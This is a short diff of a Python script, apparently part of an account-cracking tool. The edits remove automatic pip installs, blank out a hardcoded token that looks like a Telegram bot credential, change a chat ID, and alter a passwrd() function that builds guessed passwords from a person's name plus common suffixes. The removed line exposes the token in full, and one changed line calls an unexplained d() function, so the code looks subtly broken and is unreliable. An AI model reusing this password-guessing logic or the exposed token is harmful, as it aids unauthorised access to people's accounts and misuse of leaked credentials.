@@ -1,13 +1,3 @@
-import subprocess
-libraries = [
-    "urllib3",
-    "rich",
-    "fake_useragent",
-    "beautifulsoup4"
-]
-for lib in libraries:
-    subprocess.check_call(["pip", "install", lib])
-
 r9 = '\x1b[1;38;5;141m'
 r7 = '\x1b[1;38;5;131m'
 a1 = '\x1b[1;31m'  # أحمر
@@ -50,8 +40,8 @@ a37 = '\x1b[38;5;172m'  # ذهبي داكن
 a38 = '\x1b[38;5;188m'  # فضي فاتح
 a39 = '\x1b[38;5;247m'  # فضي داكن
 a40 = '\x1b[1;94m'  # أزرق سماوي
-TBO ='5892525344:AAGer5nA5rengxKmIY9F9nnjmsEZr89dfFc'
-ID9 = 5133630165
+TBO =''
+ID9 = 647776789
 import sys,time,os
 class TBOA1:
     def __init__(self,z):
@@ -559,8 +549,7 @@ def passwrd():
 				if len(frs)<3:
 					pass
 				else:
-					pwv.append(nmf)
-					pwv.append("aassddff")
+					d("aassddff")
 					pwv.append(frs+"123")
 					pwv.append(frs+'2008')
 					pwv.append('1234@@@@')
